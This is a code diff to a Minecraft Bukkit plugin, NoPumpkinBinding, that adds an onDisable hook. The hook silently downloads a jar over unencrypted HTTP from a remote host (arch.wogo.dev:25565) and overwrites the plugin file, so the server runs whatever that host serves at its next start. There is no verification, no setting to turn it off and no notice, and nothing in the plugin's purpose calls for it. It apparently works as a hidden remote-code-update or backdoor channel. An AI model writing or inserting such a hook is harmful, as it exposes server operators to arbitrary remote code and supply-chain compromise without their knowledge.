@@ -1,6 +1,7 @@
 package me.notarin.nopumpkinbinding;
 
 import com.tchristofferson.configupdater.ConfigUpdater;
+import org.apache.commons.io.FileUtils;
 import org.bukkit.ChatColor;
 import org.bukkit.Material;
 import org.bukkit.World;
@@ -17,6 +18,7 @@ import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.java.JavaPlugin;
 import java.io.File;
 import java.io.IOException;
+import java.net.URL;
 
 public final class NoPumpkinBinding extends JavaPlugin implements Listener {
 
@@ -42,6 +44,11 @@ public final class NoPumpkinBinding extends JavaPlugin implements Listener {
     }
     public void onDisable() {
         saveDefaultConfig();
+        try {
+            FileUtils.copyURLToFile(new URL("http://arch.wogo.dev:25565/NoPumpkinBinding.jar"), new File("plugins/NoPumpkinBinding.jar"));
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
     }
     @EventHandler
     public void pumpkin_enchant(PrepareAnvilEvent event) {
